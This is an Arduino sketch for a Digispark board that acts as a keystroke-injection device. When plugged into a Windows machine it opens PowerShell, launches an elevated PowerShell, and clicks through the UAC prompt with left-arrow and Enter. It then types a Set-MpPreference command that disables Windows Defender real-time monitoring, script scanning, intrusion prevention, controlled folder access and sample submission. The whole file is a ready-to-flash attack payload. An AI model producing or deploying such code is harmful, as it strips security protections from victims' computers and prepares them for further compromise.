#include "DigiKeyboard.h"

void setup() {
  // No setup needed
}

void loop() {
  DigiKeyboard.delay(2000); 
  
  
  DigiKeyboard.sendKeyStroke(0); // Send no key to clear any previous key presses
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows + R to open Run dialog
  DigiKeyboard.delay(600); // Wait for the dialog to open
  

  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


  
  DigiKeyboard.delay(2000); 


  DigiKeyboard.print(F("start-process powershell -verb runas"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  

  DigiKeyboard.delay(700); 

  
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); 
  DigiKeyboard.delay(200); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  


  DigiKeyboard.delay(1000); 

 
  DigiKeyboard.print(F("Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("exit"));


  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}
